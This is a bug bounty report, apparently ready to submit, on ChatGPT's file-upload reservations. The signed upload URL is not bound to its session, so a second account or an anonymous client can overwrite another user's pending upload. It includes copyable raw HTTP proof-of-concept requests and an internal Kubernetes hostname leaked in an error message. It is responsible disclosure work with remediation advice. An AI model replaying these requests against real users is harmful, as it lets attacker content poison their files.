# E13 — FINAL REPORT (English, ready to submit)

> **Status:** READY TO SUBMIT (after you complete the pending panel checks in Anexo B of the draft).
> Copy the whole document below into the Bugcrowd submission form.

---

**Title:** Upload SAS URL issued by `POST /backend-api/files/upload_reservations` is not bound to the creating session — replayable, usable by another account and anonymously, allowing attacker-controlled content to persist in the victim's library file

**Proposed severity:** LOW
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` (4.3)

**Justification:** integrity-only (no confidentiality, no ownership transfer). Requires possession of the capability URL (`PR:L` reflects an authenticated attacker account). Impact is limited to planting attacker-chosen bytes in the victim's own library file; no data is read and ownership stays with the victim.

---

## Description

When a file is uploaded through ChatGPT's file library, the client first creates an upload reservation (`POST /backend-api/files/upload_reservations`). The backend responds with a signed upload URL (Azure user-delegation SAS, `sp=w`, ~5-minute expiry) that the browser uses to write the file blob. **That signed URL is a pure bearer capability: it is not bound to the session that created it.**

Empirically, the same `upload_url` accepts:
- **replay** — multiple PUTs succeed (4 consecutive PUTs → HTTP 201 each);
- **cross-account writes** — a PUT from a *different* authenticated account succeeds (HTTP 201);
- **anonymous writes** — a PUT with **no cookies at all** succeeds (HTTP 201).

Because the last writer wins, an attacker who obtains a victim's `upload_url` (leaked via corporate proxy, browser history, logs, screenshot/extension telemetry, or a future IDOR listing reservations) can **overwrite the victim's pending upload**. When the victim later claims the reservation through the normal flow, the file that materializes in *their* library contains the **attacker's bytes** — verified end-to-end by downloading the victim's own `content_url` and reading the other account's content.

The signature contains a `scid` (signed client-id) claim that suggests an intended binding, but it is **not enforced** against the writer. The SAS is a standard user-delegation signature (key, resource, permissions, expiry) with **no `sip`/`sipr` source-IP claim** — so it is not IP-bound by construction either.

---

## Steps to reproduce

Use two accounts of your own: **A** = `user-hDI8xdVTY6zahW36WXAsVD8e` (test-a), **B** = `user-i5BbE1RcOASut3ys0nx5Ory7` (test-b). Obtain each account's `accessToken` from `GET /api/auth/session` (response field `accessToken`) using the account's session cookies. Wait ≥2 s between requests.

1. **Account B** creates an upload reservation and keeps the returned `upload_url`:
   ```
   POST /backend-api/files/upload_reservations
   Authorization: Bearer <TOKEN_B>
   {"intended_use_case":"my_files","entry_surface":"context_connector_upload",
    "requires_gizmo_id":false,"store_in_library":true,"library_persistence_mode":"required"}
   → 200 {"eligible":true,"reservation_id":"file_…","upload_url":"https://sdmntp…oaiusercontent.com/files/…/raw?se=…&sp=w&sv=…&sr=b&scid=…&skoid=…&sktid=…&skt=…&ske=…&sks=b&skv=…&sig=…","upload_url_expires_at":"…"}
   ```
2. **Account B** uploads legitimate content to that URL:
   ```
   PUT /files/…/raw?se=…&sig=…  (the upload_url from step 1)
   Host: sdmntp…oaiusercontent.com
   Content-Type: text/plain
   x-ms-blob-type: BlockBlob

   SYNTHETIC-B-FIRST legitimate content
   → 201
   ```
3. **Account A (different user, different session)** writes to the SAME URL:
   ```
   PUT /files/…/raw?se=…&sig=…  (B's upload_url)
   Host: sdmntp…oaiusercontent.com
   Content-Type: text/plain
   x-ms-blob-type: BlockBlob

   SYNTHETIC-A-INJECTED by account A
   → 201
   ```
   *(Also reproducible with **no cookies at all** → 201, and by re-PUTting from B → 201.)*
4. **Account B** claims her own reservation with the **true blob size** (34 bytes — the size of the last write):
   ```
   POST /backend-api/files/upload_reservations/file_000000008f3481f4adf1a86ebfdfde62/claim_and_finish
   Authorization: Bearer <TOKEN_B>
   {"file_name":"SYNTHETIC-B-CLAIMED-R3.txt","file_size":34,"use_case":"my_files",
    "index_for_retrieval":false,"store_in_library":true,"library_persistence_mode":"required"}
   → 200 {"file_id":"file_…","event":"file.processing.started",…}
   ```
5. The file becomes **ready** in **B's** library (owner = B):
   ```
   GET /backend-api/files/file_000000008f3481f4adf1a86ebfdfde62
   → 200 {"id":"file_…","owner_id":"user-i5BbE1RcOASut3ys0nx5Ory7","name":"SYNTHETIC-B-CLAIMED-R3.txt","state":"ready","size":34,…}
   ```
   and appears in `GET /backend-api/files/library/nodes` as `libfile_…` (state `ready`).
6. **Ground truth — whose content is in B's file?** B downloads her own file:
   ```
   GET /backend-api/files/library/files/{libfile}/content_url
   → 200 {"content_url":"https://chatgpt.com/backend-api/estuary/content?id=file_…&sig=…"}
   GET <content_url>  (with B's cookies + Bearer)
   → 200 "SYNTHETIC-A-INJECTED by account A"
   ```
   → the file in **B's library** contains content written by **account A**.
7. **Control (no cross-account read, no ownership transfer):** from A, `GET …/files/library/files/{libfile}` and `…/content_url` → **404** both. A claiming B's reservation returns 200 but processing fails server-side (`user_mismatch`, see Evidence) — ownership stays with B.

---

## Raw HTTP (copyable)

```
# STEP 1 — reservation (B)
POST /backend-api/files/upload_reservations HTTP/1.1
Host: chatgpt.com
User-Agent: knk-suite-researcher/2.0 bug-bounty-knk_linux
Authorization: Bearer <TOKEN_B>
Content-Type: application/json
Accept: application/json

{"intended_use_case":"my_files","entry_surface":"context_connector_upload","requires_gizmo_id":false,"store_in_library":true,"library_persistence_mode":"required"}

HTTP/1.1 200 OK
{"eligible":true,"reservation_id":"file_000000008f3481f4adf1a86ebfdfde62","upload_url":"https://sdmntprnortheu.oaiusercontent.com/files/00000000-8f34-81f4-adf1-a86ebfdfde62/raw?se=2026-09-06T05%3A11%3A58Z&sp=w&sv=2026-02-06&sr=b&scid=d9b465a2-…&sig=…","upload_url_expires_at":"2026-09-06T05:11:58Z","reservation_expires_at":"2026-09-06T05:21:58Z"}

# STEP 2 — legitimate upload by B (201)
PUT /files/00000000-8f34-81f4-adf1-a86ebfdfde62/raw?se=2026-09-06T05%3A11%3A58Z&sp=w&sv=2026-02-06&sr=b&scid=d9b465a2-…&sig=… HTTP/1.1
Host: sdmntprnortheu.oaiusercontent.com
Content-Type: text/plain
x-ms-blob-type: BlockBlob

SYNTHETIC-B-FIRST legit\n
HTTP/1.1 201 Created

# STEP 3 — CROSS-ACCOUNT write by A (201) — same URL as step 2
PUT /files/00000000-8f34-81f4-adf1-a86ebfdfde62/raw?se=2026-09-06T05%3A11%3A58Z&sp=w&sv=2026-02-06&sr=b&scid=d9b465a2-…&sig=… HTTP/1.1
Host: sdmntprnortheu.oaiusercontent.com
Content-Type: text/plain
x-ms-blob-type: BlockBlob

SYNTHETIC-A-INJECTED by account A
HTTP/1.1 201 Created

# STEP 4 — B claims her reservation (200) — file_size = true blob size (34)
POST /backend-api/files/upload_reservations/file_000000008f3481f4adf1a86ebfdfde62/claim_and_finish HTTP/1.1
Host: chatgpt.com
Authorization: Bearer <TOKEN_B>
Content-Type: application/json

{"file_name":"SYNTHETIC-B-CLAIMED-R3.txt","file_size":34,"use_case":"my_files","index_for_retrieval":false,"store_in_library":true,"library_persistence_mode":"required"}

HTTP/1.1 200 OK
{"file_id":"file_000000008f3481f4adf1a86ebfdfde62","event":"file.processing.started","message":"Start processing file: file_000000008f3481f4adf1a86ebfdfde62","progress":0.0,"extra":null}

# STEP 5 — state (B) → ready
GET /backend-api/files/file_000000008f3481f4adf1a86ebfdfde62 HTTP/1.1
Host: chatgpt.com
Authorization: Bearer <TOKEN_B>

HTTP/1.1 200 OK
{"id":"file_000000008f3481f4adf1a86ebfdfde62","owner_id":"user-i5BbE1RcOASut3ys0nx5Ory7","name":"SYNTHETIC-B-CLAIMED-R3.txt","state":"ready","size":34,…}

# STEP 6 — ground truth: B downloads her own file → A's content
GET /backend-api/files/library/files/libfile_a6c5305b8a0081919d54251599c6490d/content_url HTTP/1.1
Host: chatgpt.com
Authorization: Bearer <TOKEN_B>

HTTP/1.1 200 OK
{"content_url":"https://chatgpt.com/backend-api/estuary/content?id=file_000000008f3481f4adf1a86ebfdfde62&ts=…&p=fsns&cid=1&sig=…"}

GET <content_url> HTTP/1.1   (with B's cookies + Authorization: Bearer <TOKEN_B>)
HTTP/1.1 200 OK
SYNTHETIC-A-INJECTED by account A
```

---

## Evidence

- Raw request/response for the 3 probe rounds (incl. replay ×2 and anonymous PUT → all 201): `sas-upload-raw.txt`, `sas-upload-probe-resultado.json`.
- Decisive round (cross-account write → content persisted in B's library): `sas-round3-resultado.json`, `sas-round3-contenido.txt` (blob body = `SYNTHETIC-A-INJECTED by account A`).
- SAS parameter analysis + 5-min expiry window: `sas-ip-binding-analisis.txt`.
- **Only my own test accounts A/B were used**, all resources `SYNTHETIC-*`, ≥2.2 s between requests, no enumeration, final resource deleted (DELETE → 200). No third-party data was touched.

**Secondary observation (informative, same flow):** when a *non-owner* (A) tries to claim B's reservation, the HTTP response is 200 but the server-side processing event fails with a 403 and **leaks an internal Kubernetes hostname**:
```
{"event":"file.processing.error","message":"Error processing file file_…: 403, message='user_mismatch', url='http://sediment-service.sediment-service.svc.cluster.local:8009/finish_upload'","extra":{"error_code":"permission_error"}}
```

---

## Impact

An attacker in possession of a victim's signed `upload_url` (within its ~5-minute validity window) can **replace the content of the victim's pending upload**. The victim's own claim flow then materializes the attacker's bytes in the victim's file library, where the file can be attached to messages, shared via a public link, used in a custom GPT/agent, or exported — **stored-content poisoning / data-integrity violation against the victim's account**. Leak vectors for the URL are realistic: the SPA PUTs directly to `*.oaiusercontent.com` from the browser, so the URL transits any HTTP proxy, ends up in browser history, server/extension logs, and screenshot tooling. No confidentiality impact (no read of victim data; cross-account reads return 404) and no ownership transfer (claim is owner-gated via `user_mismatch`).

---

## Remediation

1. **Bind the SAS to the session** — validate in the storage/metadata layer that the PUT principal matches the reservation owner (the `scid` client-id claim exists but is not enforced; the sediment `finish_upload` check is applied at claim time, not at write time).
2. **Single-use or limited-write SAS** — invalidate the `upload_url` after the first successful PUT so a leaked URL cannot be replayed to overwrite.
3. Keep the short expiry (already ~5 min) and remove unverifiable claims from the signature.

---

## Limitations

- **IP binding not fully excluded:** A and B ran from the same network egress (`90.173.225.104`); the anonymous same-IP PUT returned 201. The SAS contains **no `sip`/`sipr` claims** (Azure's native IP-binding mechanism), so it is not IP-bound by construction, but a *custom* server-side source-IP check in OpenAI's proxy cannot be ruled out without a different-egress test. A separate round with a different network egress is planned.
- **Duplicate check:** no public duplicate found (Bugcrowd policy, 2026 disclosures, writeups, CVE/GHSA, storage-host references). Authenticated panel check (Known Issues / Disclosures) pending at submission time.
- **Scope note:** the vulnerable design lives in the `chatgpt.com` backend API (it issues the unbound capability); the storage host `*.oaiusercontent.com` is where the capability executes. Please confirm scope coverage accordingly.

---

**Compliance:** tests were performed exclusively against my own two test accounts with synthetic content, paced ≥2.2 s, with no enumeration and no modification of third-party data. All resources created for this PoC were deleted after verification.